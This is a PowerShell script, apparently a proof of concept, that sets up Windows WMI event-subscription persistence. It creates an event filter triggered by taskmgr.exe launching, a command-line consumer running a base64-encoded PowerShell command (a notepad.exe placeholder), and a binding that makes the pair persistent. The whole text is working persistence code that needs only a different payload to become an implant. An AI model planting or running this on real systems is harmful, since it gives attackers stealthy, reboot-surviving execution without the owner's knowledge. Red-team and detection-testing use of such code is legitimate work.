$EventFilterName = 'calcSpawned'
$EventConsumerName = 'launchPowerShell'
$payload = "cmd.exe /C powershell.exe -enc bgBvAHQAZQBwAGEAZAAuAGUAeABlAA=="

# Create event filter to trigger when the process taskmgr.exe is created
$EventFilterArgs = @{
    EventNamespace = 'root/cimv2'
    Name = $EventFilterName
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='taskmgr.exe'"
    QueryLanguage = 'WQL'
}

$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

# Create CommandLineEventConsumer
$CommandLineConsumerArgs = @{
    Name = $EventConsumerName
    CommandLineTemplate = $payload
}
$Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

# Create FilterToConsumerBinding
$FilterToConsumerArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
